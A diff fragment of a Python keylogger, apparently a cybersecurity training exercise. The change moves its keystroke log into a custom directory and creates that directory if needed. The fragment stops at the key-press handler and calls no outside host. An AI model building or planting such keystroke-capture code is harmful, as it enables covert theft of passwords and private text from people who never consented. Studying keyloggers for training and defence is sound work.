@@ -1,8 +1,13 @@
 # Import necessary modules from the pynput library
 from pynput.keyboard import Key, Listener
 
-# Specify the file where keystrokes will be saved
-log_file = "key_log.txt"
+# Specify the custom directory and log file name
+log_dir = "/home/phoenix/Downloads/PRODIGY_CS_02/logs" # change username to your actual username
+log_file = os.path.join(log_dir, "key_log.txt") #combine the directory and filename
+
+# Ensure the log direcory exists, or create a new one
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
 
 # Define a function that handles key presses
 def on_press(key):
